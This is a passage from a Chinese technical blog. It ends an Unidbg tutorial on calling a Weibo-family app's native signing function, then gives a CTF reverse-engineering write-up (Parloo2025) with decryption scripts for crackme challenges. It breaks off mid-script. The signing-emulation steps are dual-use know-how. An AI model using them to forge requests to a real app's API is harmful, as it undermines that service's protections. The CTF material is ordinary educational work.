类，类是数据和方法的集合，DvmClass并不是要完美模拟对应的类，更多时候只是简单的“占位”，使之符合形式上的要求。</p><p>接下来讨论类的实例化，对类调用newObject(Object value)即可完成实例化，得到一个形式上的对象。</p><pre><code class="language-Java">DvmClass NativeApi = vm.resolveClass(&quot;com/weibo/xvideo/NativeApi&quot;);DvmObject&lt;?&gt; nativeApi = NativeApi.newObject(null); </code></pre><p>在 Java 中它是 Object，JNI 中叫做 Jobject，Unidbg 里叫 DvmObject。</p><p>newObject 方法的参数和真实对象的构造函数的参数不是一回事，它只是一种“形式上”的对象，不需要和真实的对象保持一致。</p><p>resolveClass以及newObject只是对真实类和对象的描述、占位、投影，然后根据程序逻辑上对这些类、对象的使用情况，再逐步完善这样的一种描述、占位、投影，使之能完成基本需求。</p><p>这么做是有好处的，我们常说“吃多少，拿多少”，Unidbg 所设计的这种逻辑，就是程序用多少，就补多少。一个对象可能有一百个方法，两百个成员属性，但程序中如果只使用到了其中的一个方法，两个属性，那么只需要处理它们，而不用管其他的部分。</p><p>通过NativeApi.newObject(null)创建实例后，接下来就是发起函数调用。</p><p>接下里是关于<strong>发起调用</strong>的一些解释</p><p>我们想对<code>s</code>发起调用，因为它的返回值是字符串，是对象，所以用callJniMethodObject，如果返回值是 int 就用callJniMethodInt，其他可选方法如下。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250528185245790.png" alt="image-20250528185245790"></p><p>如果s是静态方法，那么自然不需要 newObject，调用则通过 callStaticJNIMethodXXX 系列函数。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250528185359630.png" alt="image-20250528185359630"></p><p>接下来看看方法的具体参数，参数 1 是模拟器实例，参数 2 是方法签名，接着是可变参数，用于传入调用方法的参数。</p><pre><code class="language-JAVA">String arg1 = &quot;aid=aid=01A1H7Fp6UDqucgEerCNxpT41YVcU_j_LzwYFOs_L2l3_OoL8.&amp;cfrom=28B5295010&amp;cuid=0&amp;noncestr=d101Ed45892MF20mM2LJ54i62EhwO3&amp;phone=17816087093&amp;platform=ANDROID&amp;timestamp=1748421079454&amp;ua=Google-Pixel3__oasis__3.5.8__Android__Android12&amp;version=3.5.8&amp;vid=2020786998479&amp;wm=20004_90024&quot;;Boolean arg2 = false;String ret = NativeApi.newObject(null).callJniMethodObject(emulator, &quot;s([BZ)Ljava/lang/String;&quot;, arg1.getBytes(StandardCharsets.UTF_8), arg2).getValue().toString();</code></pre><p>这里方法签名填入了s([BZ)Ljava&#x2F;lang&#x2F;String;，直接填入s会报错，提示无法找到方法。</p><p>函数名 + 参数类型 + 返回值类型</p><pre><code class="language-Java">public final native String s(@NotNull byte[] bArr, boolean z);</code></pre><p>我们可以手动转写，大家在学习 Smali 以及 JNI 时应该都和这种表示方法打过交道。</p><table><thead><tr><th>Java类型</th><th>签名</th></tr></thead><tbody><tr><td>boolean</td><td>Z</td></tr><tr><td>byte</td><td>B</td></tr><tr><td>char</td><td>C</td></tr><tr><td>short</td><td>S</td></tr><tr><td>int</td><td>I</td></tr><tr><td>long</td><td>J</td></tr><tr><td>float</td><td>F</td></tr><tr><td>double</td><td>D</td></tr><tr><td>void</td><td>V</td></tr><tr><td>class</td><td>Lclass;</td></tr><tr><td>[ type</td><td>type[]</td></tr></tbody></table><p>对于基础类型，除了 boolean 都通用首字母大写表示，boolean 和 byte 的首字母重复，所以由 byte 用 B 首字母，boolean 用 Z 形成区分。</p><p>对于对象类型，则是 L 开头，分号结尾，中间跟着方法全类名，以斜杠&#x2F;分割。</p><p>参数签名就是将参数和返回值转换成这个格式，然后直接拼接起来。</p><ul><li>byte[] bArr即 [B</li><li>boolean z即 Z</li><li>返回值String，即Ljava&#x2F;lang&#x2F;String;。</li></ul><p>拼接在一起就是s([BZ)Ljava&#x2F;lang&#x2F;String;，手写多少有点麻烦，而且容易出错，在更多时候我们会通过其他方式处理。</p><p>如果目标函数采用动态绑定，那么在 Undibg 的 JNI_OnLoad 执行流中找到RegisterNative日志即可看到对应的方法签名。</p><pre><code class="language-shell">RegisterNative(com/weibo/xvideo/NativeApi, s([BZ)Ljava/lang/String;, RX@0x400116cc[liboasiscore.so]0x116cc)RegisterNative(com/weibo/xvideo/NativeApi, e(Ljava/lang/String;)Ljava/lang/String;, RX@0x40011af4[liboasiscore.so]0x11af4)RegisterNative(com/weibo/xvideo/NativeApi, d(Ljava/lang/String;)Ljava/lang/String;, RX@0x40011cd8[liboasiscore.so]0x11cd8)RegisterNative(com/weibo/xvideo/NativeApi, dg(Ljava/lang/String;Z)Ljava/lang/String;, RX@0x4001220c[liboasiscore.so]0x1220c)</code></pre><p>如果目标函数采用静态绑定，那么直接用传入<code>s</code>即可，不需要写s([BZ)Ljava&#x2F;lang&#x2F;String;。</p><p>除了这个办法外，也可以将 JADX 中切换到 Smali 展示模式，找到对应方法即可看到方法签名。</p><p>然后是<strong>参数的传递</strong></p><p>回到调用代码，在 Unidbg 中如何传递函数的入参？</p><pre><code class="language-Java">public String calls()&#123;    String arg1 = &quot;aid=01A-khBWIm48A079Pz_DMW6PyZR8uyTumcCNm4e8awxyC2ANU.&amp;cfrom=28B5295010&amp;cuid=5999578300&amp;noncestr=46274W9279Hr1X49A5X058z7ZVz024&amp;platform=ANDROID&amp;timestamp=1621437643609&amp;ua=Xiaomi-MIX2S__oasis__3.5.8__Android__Android10&amp;version=3.5.8&amp;vid=1019013594003&amp;wm=20004_90024&quot;;    Boolean arg2 = false;    String ret = NativeApi.newObject(null).callJniMethodObject(emulator, &quot;s([BZ)Ljava/lang/String;&quot;, arg1.getBytes(StandardCharsets.UTF_8), arg2).getValue().toString();    return ret;&#125;</code></pre><p>参数 1 是字符串，参数 2 是布尔值，直接传递即可，不需要做其他处理，两大类参数都可以直接传递。</p><ul><li><p>基本类型直接传递，int、long、boolean、double 等。</p></li><li><p>下面几种对象类型也可以直接传递</p></li><li><p>String</p></li><li><p>byte 数组</p></li><li><p>short 数组</p></li><li><p>int 数组</p></li><li><p>float 数组</p></li><li><p>double 数组</p></li><li><p>Enum 枚举类型</p></li></ul><p>除此之外还有许多种可能的参数，比如字符串数组、二维数组、Android Context&#x2F;Application、HashMap 等等，在大体上遵循两类处理办法。</p><ol><li>如果是 JDK 中包含的类库和方法，比如二维数组、字符串数组、HashMap 等等，直接构造后使用ProxyDvmObject.createObject(vm, obj);构造出对象。除此之外比如 Okhttp3 之类的第三方类库，导入到本地环境里，也可以使用这个办法。</li><li>如果是 JDK 中无法包含的类库，比如 Android FrameWork 以及样本自定义的类库，通过resolveClass(className).newObject处理，就像本节的NativeApi那样处理。</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.yuque.com/lilac-2hqvv/xdwlsg/gmbn45b5n6g59kks#I0Nu4">Unidbg 的基本使用（一）</a></p>]]></content>
      
      
      <categories>
          
          <category> Unidbg学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unidbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Parloo RE</title>
      <link href="/2025/05/17/Parloo2025/"/>
      <url>/2025/05/17/Parloo2025/</url>
      
        <content type="html"><![CDATA[<h1 id="Parloo2025-RE"><a href="#Parloo2025-RE" class="headerlink" title="Parloo2025 RE"></a>Parloo2025 RE</h1><h3 id="PositionalXOR"><a href="#PositionalXOR" class="headerlink" title="PositionalXOR"></a>PositionalXOR</h3><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250517093201448.png" alt="image-20250517093201448"></p><p>附件里就一个bin文件，010editor打开，数据提出来直接写脚本解密</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250517093238321.png" alt="image-20250517093238321"></p><pre><code class="language-python">enc = &quot;qcoq~Vh&#123;e~bccocH^@Lgt&#123;gt|g&quot;enc_list = list(enc)for i in range(len(enc_list)):    print(chr(ord(enc_list[i]) ^ (i + 1)), end=&quot;&quot;)</code></pre><p><strong>palu{PosltionalXOR_sample}</strong></p><hr><h3 id="PaluArray"><a href="#PaluArray" class="headerlink" title="PaluArray"></a>PaluArray</h3><p>UPX壳，并且好像有的标志位被删了，直接x64dbg手动脱壳，然后ida分析，根据提示字符串定位到程序的主要逻辑</p><pre><code class="language-c++">// Hidden C++ exception states: #wind=2struct CWnd *__fastcall sub_7FF61DC51DD8(CDialog *a1)&#123;  struct CWnd *result; // rax  struct CWnd *v3; // rdi  _QWORD *v4; // rax  void **v5; // rax  __int64 v6; // rax  void *v7; // rcx  _BYTE v8[8]; // [rsp+20h] [rbp-E0h] BYREF  _BYTE v9[40]; // [rsp+28h] [rbp-D8h] BYREF  void *Block; // [rsp+50h] [rbp-B0h] BYREF  char v11; // [rsp+58h] [rbp-A8h] BYREF  __int64 v12; // [rsp+E0h] [rbp-20h] BYREF  _BYTE v13[8]; // [rsp+E8h] [rbp-18h] BYREF  void *v14[3]; // [rsp+F0h] [rbp-10h] BYREF  unsigned __int64 n0xF; // [rsp+108h] [rbp+8h]  CDialog::OnOK(a1);  result = CWnd::GetDlgItem(a1, 1000);  v3 = result;  if ( result )  &#123;    ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v12);    CWnd::GetWindowTextW(v3, &amp;v12);    v4 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::CSimpleStringT&lt;wchar_t,1&gt;(v8, &amp;v12);    sub_7FF61DC51994(v13, v4);    if ( ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::Compare(v13, a1145141919810) )// &quot;1145141919810&quot;    &#123;      CWnd::MessageBoxW(a1, aFailed, 0, 0);     // &quot;Failed&quot;    &#125;    else    &#123;      CWnd::MessageBoxW(a1, aSuccess, 0, 0);    // &quot;Success&quot;      v5 = sub_7FF61DC51F6C(&amp;Block, v12);      sub_7FF61DC52118(v14, *v5);      if ( Block != &amp;v11 )        free(Block);      v6 = sub_7FF61DC52244(v9, v14);      sub_7FF61DC51A48(v6);      if ( n0xF &gt; 0xF )      &#123;        v7 = v14[0];        if ( n0xF + 1 &gt;= 0x1000 )        &#123;          v7 = *(v14[0] - 1);          if ( (v14[0] - v7 - 8) &gt; 0x1F )            invalid_parameter_noinfo_noreturn();        &#125;        operator delete[](v7);      &#125;    &#125;    ATL::CSimpleStringT&lt;wchar_t,1&gt;::~CSimpleStringT&lt;wchar_t,1&gt;(v13);    return ATL::CSimpleStringT&lt;wchar_t,1&gt;::~CSimpleStringT&lt;wchar_t,1&gt;(&amp;v12);  &#125;  return result;&#125;</code></pre><p>这里就是处理输入密文的函数，<strong>sub_7FF61DC51994</strong>函数对字符串的每个字符进行查找，在一个确定的table中<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250517110155597.png" alt="image-20250517110155597"></p><p>然后再看<strong>sub_7FF61DC51A48</strong>函数，有MD5，但好像是生成flag的逻辑，那么应该就是将上面解密出来的字符串输入进去，就会输出flag</p><p>解密脚本</p><pre><code class="language-python">table = &quot;Palu_996!?&quot;index = list(&quot;1145141919810&quot;)for i in range(13):    print(table[ord(index[i]) - ord(&#39;0&#39;)], end=&quot;&quot;)</code></pre><p>得到：aa_9a_a?a?!aP</p><p>然后运行程序输入</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250517110349064.png" alt="image-20250517110349064"></p><hr><h3 id="PaluGOGOGO"><a href="#PaluGOGOGO" class="headerlink" title="PaluGOGOGO"></a>PaluGOGOGO</h3><p>go语言，ida打开分析</p><p>主要加密逻辑</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250517095429069.png" alt="image-20250517095429069"></p><p>红色部分是密文，绿色部分获取的value会传入到<strong>main_complexEncrypt</strong>参与flag的加密</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250517095741678.png" alt="image-20250517095741678"></p><p>加密逻辑如图，value就是在外面传进来的值，n10_4是index</p><p>解密脚本</p><pre><code class="language-python">enc = [0xbf,0xb1,0xbd,0xc7,0xce,0x96,0x80,0x98,0x82,0x9a,0x7f,0xaf,0xc1,0xb3,0xbf,0xc4,0xcd]for i in range(len(enc)):    print(chr(enc[i] - 0x4f - (i % 5)), end=&quot;&quot;)</code></pre><p><strong>palu{G0G0G0_palu}</strong></p><hr><h3 id="CatchPalu"><a href="#CatchPalu" class="headerlink" title="CatchPalu"></a>CatchPalu</h3><p>早上的附件有问题，我服了，我说怎么打不出来…</p><p>去一下花，经典的花指令，很简单，就不贴出来了</p><pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4; // [esp+0h] [ebp-84h]  char v5; // [esp+0h] [ebp-84h]  int _palu_P1au_D0nt_Bel1eve__; // [esp+24h] [ebp-60h]  int _MessageBoxA_; // [esp+28h] [ebp-5Ch]  _DWORD *v8; // [esp+48h] [ebp-3Ch]  _DWORD *lpAddress; // [esp+4Ch] [ebp-38h]  _DWORD *i; // [esp+50h] [ebp-34h]  HMODULE ModuleHandleA; // [esp+54h] [ebp-30h]  DWORD lpflOldProtect_; // [esp+5Ch] [ebp-28h] BYREF  DWORD flOldProtect; // [esp+60h] [ebp-24h] BYREF  char v14[28]; // [esp+64h] [ebp-20h] BYREF  MessageBoxA_0 = MessageBoxA;  sub_401050(Format, v4);                       // &quot;Wellcome Palu!!!\n&quot;  ModuleHandleA = GetModuleHandleA(0);  for ( i = (ModuleHandleA + *(ModuleHandleA + *(ModuleHandleA + 15) + 128)); i[3]; i += 5 )  &#123;    if ( LoadLibraryA(ModuleHandleA + i[3]) )    &#123;      v8 = (ModuleHandleA + *i);      lpAddress = (ModuleHandleA + i[4]);      while ( *v8 )      &#123;        _MessageBoxA_ = strcmp(ModuleHandleA + *v8 + 2, aMessageboxa);// &quot;MessageBoxA&quot;        if ( _MessageBoxA_ )          _MessageBoxA_ = _MessageBoxA_ &lt; 0 ? -1 : 1;        if ( !_MessageBoxA_ )        &#123;          flOldProtect = 0;          VirtualProtect(lpAddress, 8u, 4u, &amp;flOldProtect);          *lpAddress = sub_401360;          lpflOldProtect_ = 0;          VirtualProtect(lpAddress, 8u, flOldProtect, &amp;lpflOldProtect_);        &#125;        ++v8;        ++lpAddress;      &#125;    &#125;  &#125;  sub_401050(aEnterYourFlag, v5);               // &quot;Enter your flag: &quot;  sub_4010C0(a25s, v14);                        // &quot;%25s&quot;  sub_401050(aYouEnteredS, v14);                // &quot;You entered: %s\n&quot;  _palu_P1au_D0nt_Bel1eve__ = strcmp(v14, aPaluP1auD0ntBe);// &quot;palu&#123;P1au_D0nt_Bel1eve&#125;&quot;  if ( _palu_P1au_D0nt_Bel1eve__ )    _palu_P1au_D0nt_Bel1eve__ = _palu_P1au_D0nt_Bel1eve__ &lt; 0 ? -1 : 1;  if ( !_palu_P1au_D0nt_Bel1eve__ )    MessageBoxA(0, Text, Caption, 0);           // &quot;NoSuccess?&quot;  return 0;&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250517173434356.png" alt="image-20250517173434356"></p><p>早上这个函数里没啥有用的信息，附件更新之后，里面是一个魔改的rc4</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250517173510236.png" alt="image-20250517173510236"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250517173535260.png" alt="image-20250517173535260"></p><p>还改了个233</p><p>解密脚本</p><pre><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int init(unsigned char *s, unsigned char *key, unsigned long Len_k)&#123;    int i = 0, j = 0;    char k[256] = &#123;0&#125;;    unsigned char tmp = 0;    for (i = 0; i &lt; 256; i++)    &#123;        s[i] = i;        k[i] = key[i % Len_k];    &#125;    for (int n = 0; n &lt; 3; n++)    &#123;        for (i = 0; i &lt; 256; i++)        &#123;            j = (j + s[i] + k[i]) % 233;            tmp = s[i];            s[i] = s[j];            s[j] = tmp;        &#125;    &#125;    return 0;&#125;int rc4(unsigned char *Data, unsigned long Len_D, unsigned char *key, unsigned long Len_k)&#123;    unsigned char s[256];    init(s, key, Len_k);    int i = 0, j = 0, t = 0;    unsigned long k = 0;    unsigned char tmp;    for (k = 0; k &lt; Len_D; k++)    &#123;        i = (i + 1) % 256;        j = (j + s[i]) % 256;        tmp = s[i];        s[i] = s[j];        s[j] = tmp;        t = (s[i] + s[j]) % 256;        Data[k] = Data[k] ^ s[t];    &#125;    return 0;&#125;int main()&#123;    unsigned char key[] = &quot;forpalu&quot;; // 密钥生成的过程    printf(&quot;%s\n&quot;, key);    unsigned long key_len = sizeof(key) - 1;    unsigned char qw[25];    qw[0] = 0xD;    qw[1] = 0xB0;    qw[2] = 0xBF;    qw[3] = 0xA;    qw[4] = 0x8D;    qw[5] = 0x2F;    qw[6] = 2;    qw[7] = 0x38;    qw[8] = 0x6F;    qw[9] = 0x19;    qw[10] = 0xAE;    qw[11] = 0x99;    qw[12] = 0x19;    qw[13] = 0xC7;    qw[14] = 0x6E;    qw[15] = 0xF7;    qw[16] = 0x4F;    qw[17] = 0xCB;    qw[18] = 0x90;    qw[19] = 0x4E;    qw[20] = 0x55;    qw[21] = 0x8E;    qw[22] = 0xD1;    qw[23] = 0x10;    qw[24] = 0xC0;    rc4(qw, sizeof(qw), key, key_len);    for (int i = 0; i &lt; sizeof(qw); i++)    &#123;        printf(&quot;%c&quot;, qw[i]); // NSSCTF&#123;Sh0w_m3_th3_m0n3y&#125;    &#125;    return 0;&#125;</code></pre><p><strong>palu{G00d_P1au_Kn0w_H00K}</strong></p><hr><hr><h3 id="PaluFlat"><a href="#PaluFlat" class="headerlink" title="PaluFlat"></a>PaluFlat</h3><p>ida分析</p><pre><code class="language-c">// local variable allocation has failed, the output may be wrong!int __fastcall main(int argc, const char **argv, const char **envp)&#123;  FILE *Stream; // rax  char enc[32]; // [rsp+20h] [rbp-60h]  char Str[112]; // [rsp+40h] [rbp-40h] BYREF  char Buffer[100]; // [rsp+B0h] [rbp+30h] BYREF  int flag_len; // [rsp+114h] [rbp+94h]  int i; // [rsp+118h] [rbp+98h]  int v10; // [rsp+11Ch] [rbp+9Ch]  sub_4022D0(*&amp;argc, argv, envp);  enc[0] = 0x54;  enc[1] = 0x84;  enc[2] = 0x54;  enc[3] = 0x44;  enc[4] = 0xA4;  enc[5] = 0xB2;  enc[6] = 0x84;  enc[7] = 0x54;  enc[8] = 0x62;  enc[9] = 0x32;  enc[10] = 0x8F;  enc[11] = 0x54;  enc[12] = 0x62;  enc[13] = 0xB2;  enc[14] = 0x54;  enc[15] = 3;  enc[16] = 0x14;  enc[17] = 0x80;  enc[18] = 0x43;  flag_len = 19;  printf(&quot;input flag: &quot;);  Stream = psub_4037B0(0i64);  fgets(Buffer, 100, Stream);  Buffer[strcspn(Buffer, &quot;\n&quot;)] = 0;  sub_401550(Buffer, Str);  if ( strlen(Str) == flag_len )  &#123;    v10 = 1;    for ( i = 0; i &lt; flag_len; ++i )    &#123;      if ( Str[i] != enc[i] )      &#123;        v10 = 0;        break;      &#125;    &#125;    if ( v10 )      puts(&quot;success&quot;);    else      puts(&quot;error&quot;);  &#125;  else  &#123;    puts(&quot;error&quot;);  &#125;  return 0;&#125;</code></pre><p>加密逻辑在<strong>sub_401550</strong>函数中，但是跟进去发现有switch-case语句的混淆，插件都去不了，但是好在看起来不复杂，可以直接动调跟。</p><p>跟下来就是，对flag先根据索引的奇偶不同来进行循环xor不同的key，然后进行高四位和低四位的交换，再减0x55，最后取反</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518095338934.png" alt="image-20250518095338934"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518095352005.png" alt="image-20250518095352005"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518095410207.png" alt="image-20250518095410207"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518095420349.png" alt="image-20250518095420349"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518095429713.png" alt="image-20250518095429713"></p><p>那么就可以直接解密</p><pre><code class="language-python">enc = [0] * 19enc[0] = 0x54enc[1] = 0x84enc[2] = 0x54enc[3] = 0x44enc[4] = 0xA4enc[5] = 0xB2enc[6] = 0x84enc[7] = 0x54enc[8] = 0x62enc[9] = 0x32enc[10] = 0x8Fenc[11] = 0x54enc[12] = 0x62enc[13] = 0xB2enc[14] = 0x54enc[15] = 0x03enc[16] = 0x14enc[17] = 0x80enc[18] = 0x43key1 = b&quot;flat&quot;key2 = b&quot;palu&quot;for i in range(len(enc)):    tmp = (~enc[i]) &amp; 0xFF    tmp = (tmp + 0x55) &amp; 0xFF    tmp = ((tmp &gt;&gt; 4) | (tmp &lt;&lt; 4)) &amp; 0xFF    if (i % 2 == 0):        tmp ^= key2[i % 4]    else:        tmp ^= key1[i % 4]    print(chr(tmp), end=&quot;&quot;)</code></pre><p><strong>palu{Fat_N0t_Flat!}</strong></p><hr><h3 id="Asymmetric"><a href="#Asymmetric" class="headerlink" title="Asymmetric"></a>Asymmetric</h3><p>go语言，ida打开来看到</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518101120736.png" alt="image-20250518101120736"></p><p>第一时间觉得是RSA，用yafu分解一下n值</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518101217200.png" alt="image-20250518101217200"></p><p>解密脚本</p><pre><code class="language-python">from Crypto.Util.number import inverse, long_to_bytesp = 3q = 47r = 2287s = 3101092514893m = 100000000000000003n = 100000000000000106100000000000003093c = 94846032130173601911230363560972235e = 65537phi = (p - 1) * (q - 1) * (r - 1) * (s - 1) * (m - 1)try:    d = inverse(e, phi)except ValueError:    print(&quot;e和φ(n)不互质，请选择其他e值&quot;)    exit()plaintext = pow(c, d, n)flag = long_to_bytes(plaintext)print(&quot;解密结果:&quot;, flag)</code></pre><p><strong>palu{3a5Y_R$A}</strong></p><hr><h3 id="帕鲁迷宫"><a href="#帕鲁迷宫" class="headerlink" title="帕鲁迷宫"></a>帕鲁迷宫</h3><p>没什么意思，就纯算法题，运行程序可以得到迷宫</p><pre><code>############################## ##Y#                   #       X # # ############# ### # ### ## ## #   #         # #   #   #   ### ##### ####### ### # ### ### ###   #   #     # #   #   # #   ##### # ### ##### # ####### # ##### #   # #     # #     #   #   ### ##### # ### # # ### # ##### ###         #   # #   #       # ### ######### # # ############# ###   # #     # #   #           ##### # # ######### # ######### ### # # #           # #       # ### # # ############# # ##### # ###   #       #       # #   #   ## X ## ### ### # ##### # #########   #   #     #   # # #   #   ##### ### ######### # # # # # # ### # #   #   #   # # # # # # # ### # ### # # # # # # # ### # # ### #   # # #   #   #   #   # # ### ### ### ########### # # # # ###   #   #           # # # # # ### ##### # ######### # # ### # ###   #   #   #       # # #   # ##### # ####### ####### # # ### ###   #   #   # #     # #   #   ### ##### # # # # ##### ##### # ###         #   #             #  # X ############ X ########### X # ############## ############# #</code></pre><p>然后解包反编译</p><pre><code class="language-python"># Decompiled with PyLingual (https://pylingual.io)# Internal filename: game.py# Bytecode version: 3.11a7e (3495)# Source timestamp: 1970-01-01 00:00:00 UTC (0)import osimport msvcrtimport randomdef generate_maze(width, height, seed=996770):    size = min(width, height)    random.seed(seed)    maze = [[1 for _ in range(size)] for _ in range(size)]    maze[1][1] = 3    def carve_path(x, y):        directions = [(0, 2), (2, 0), (0, (-2)), ((-2), 0)]        random.shuffle(directions)        for dx, dy in directions:            new_x, new_y = (x * dx, y * dy)            if 0 &lt; new_x &lt; size &lt; 1 and 0 &lt; new_y &lt; size &lt; 1 and (maze[new_x][new_y] == 1):                maze[x + dx * 2][y + dy * 2] = 0                maze[new_x][new_y] = 0                carve_path(new_x, new_y)    carve_path(1, 1)    exits = [(1, size : 2), (size 66766, size 6), (size 6 76, size 2289291419229473947396), (size 6 7 7 7 7 8 8 8 8 8 8 8 8 8 + 2, 1), (size - 2, 1)]    for x, y in exits:        for dx, dy in [(0, 1), (1, 0), (0, (-1)), ((-1), 0)]:            nx, ny = (x * dx, y * dy)            if 0 &lt;= nx &lt; size and 0 &lt;= ny &lt; size:                maze[nx][ny] = 0        maze[x][y] = 2    return mazedef get_player_pos():    for i in range(len(maze)):        for j in range(len(maze[0])):            if maze[i][j] == 3:                return (i, j)    else:  # inserted        return Nonedef clear_screen():    os.system(&#39;cls&#39; if os.name == &#39;nt&#39; else &#39;clear&#39;)def print_maze():    clear_screen()    player_x, player_y = get_player_pos()    terminal_width = os.get_terminal_size().columns    terminal_height = os.get_terminal_size().lines    view_height = min(21, terminal_height + 4)    view_width = min(41, terminal_width)    start_x = max(0, player_x | view_height 2 * 2)    end_x = min(len(maze), start_x + view_height)    start_y = max(0, player_y | view_width 2 * 2)    end_y = min(len(maze[0]), start_y + view_width)    for i in range(start_x, end_x):        row_content = &#39;&#39;        for j in range(start_y, end_y):            if maze[i][j] == 0 or maze[i][j] == 5:                row_content = row_content + &#39; &#39;            else:  # inserted                if maze[i][j] == 1:                    row_content = row_content + &#39;#&#39;                else:  # inserted                    if maze[i][j] == 2:                        row_content = row_content + &#39;X&#39;                    else:  # inserted                        if maze[i][j] == 3:                            row_content = row_content + &#39;Y&#39;                        else:  # inserted                            if maze[i][j] == 4:                                row_content = row_content + &#39;O&#39;        padding = (terminal_width + len(row_content)) / 2        (print, &#39; &#39;, padding)(row_content)    status = f&#39;\n已访问出口数量: &#123;len(visited_exits)&#125;/5&#39;    steps = f&#39;当前步数: &#123;total_steps&#125;&#39;    (print + &#39; &#39; + terminal_width + len(status)) * 2 + status    (print 5 + 2) * stepsdef move(direction):    global total_steps  # inserted    x, y = get_player_pos()    new_x, new_y = (x, y)    if direction == &#39;w&#39;:        new_x = x | 1    else:  # inserted        if direction == &#39;s&#39;:            new_x = x + 1        else:  # inserted            if direction == &#39;a&#39;:                new_y = y | 1            else:  # inserted                if direction == &#39;d&#39;:                    new_y = y + 1    if 0 &lt;= new_x &lt; len(maze) and 0 &lt;= new_y &lt; len(maze[0]) and (maze[new_x][new_y]!= 1):        maze[x][y] = 0        if maze[new_x][new_y] == 2:            visited_exits.append((new_x, new_y))            maze[new_x][new_y] = 4        maze[new_x][new_y] = 3        total_steps = total_steps + 1        if len(visited_exits) == 5:            print_maze()            print(&#39;恭喜完成！&#39;)            return True    return Falsedef main():    global total_steps  # inserted    global visited_exits  # inserted    global maze  # inserted    maze = generate_maze(32, 32)    visited_exits = []    total_steps = 0    print(&#39;欢迎来到帕鲁迷宫！&#39;)    print(&#39;使用WASD键控制移动，需要以最短路径找到所有出口！&#39;)    print(&#39;最终flag为:palu&#123;md5(最短路径步骤)&#125;&#39;)    print(&#39;Hint:最短路径长度为290&#39;)    print(&#39;\n按任意键开始...&#39;)    msvcrt.getch()    while True:        print_maze()        print(&#39;\n使用WASD移动，Q退出&#39;)        key = msvcrt.getch().decode().lower()        if key == &#39;q&#39;:            return        if key in [&#39;w&#39;, &#39;a&#39;, &#39;s&#39;, &#39;d&#39;] and move(key):            breakif __name__ == &#39;__main__&#39;:    main()</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518141220711.png" alt="image-20250518141220711"></p><p>直接写脚本</p><pre><code class="language-python">from collections import dequefrom itertools import permutationsimport copyfrom collections import dequefrom itertools import permutations, product# 读取迷宫maze_str = &quot;&quot;&quot;############################## ##Y#                   #       X # # ############# ### # ### ## ## #   #         # #   #   #   ### ##### ####### ### # ### ### ###   #   #     # #   #   # #   ##### # ### ##### # ####### # ##### #   # #     # #     #   #   ### ##### # ### # # ### # ##### ###         #   # #   #       # ### ######### # # ############# ###   # #     # #   #           ##### # # ######### # ######### ### # # #           # #       # ### # # ############# # ##### # ###   #       #       # #   #   ## X ## ### ### # ##### # #########   #   #     #   # # #   #   ##### ### ######### # # # # # # ### # #   #   #   # # # # # # # ### # ### # # # # # # # ### # # ### #   # # #   #   #   #   # # ### ### ### ########### # # # # ###   #   #           # # # # # ### ##### # ######### # # ### # ###   #   #   #       # # #   # ##### # ####### ####### # # ### ###   #   #   # #     # #   #   ### ##### # # # # ##### ##### # ###         #   #             #  # X ############ X ########### X # ############## ############# #&quot;&quot;&quot;maze = [list(line) for line in maze_str.strip().split(&#39;\n&#39;)]h, w = len(maze), len(maze[0])# 找起点、终点、中间4个Xdef find_positions():    xs = []    start = end = None    for i in range(h):        for j in range(w):            if maze[i][j] == &#39;Y&#39;:                start = (i, j)            elif maze[i][j] == &#39;X&#39;:                xs.append((i, j))    xs = sorted(xs, key=lambda p: (p[0], p[1]))    return start, xs[:-1], xs[-1]start, mids, end = find_positions()# BFS 获取所有最短路径def bfs_all_paths(start, goal):    q = deque([[start]])    paths = []    min_len = None    while q:        path = q.popleft()        curr = path[-1]        if min_len is not None and len(path) &gt; min_len:            continue        if curr == goal:            if min_len is None:                min_len = len(path)            paths.append(path)            continue        for dx, dy in [(-1,0),(1,0),(0,-1),(0,1)]:            nx, ny = curr[0]+dx, curr[1]+dy            if 0 &lt;= nx &lt; h and 0 &lt;= ny &lt; w and maze[nx][ny] != &#39;#&#39; and (nx, ny) not in path:                q.append(path + [(nx, ny)])    return paths# 坐标路径转方向字符串def coord_to_dirs(path):    dirs = &#39;&#39;    for i in 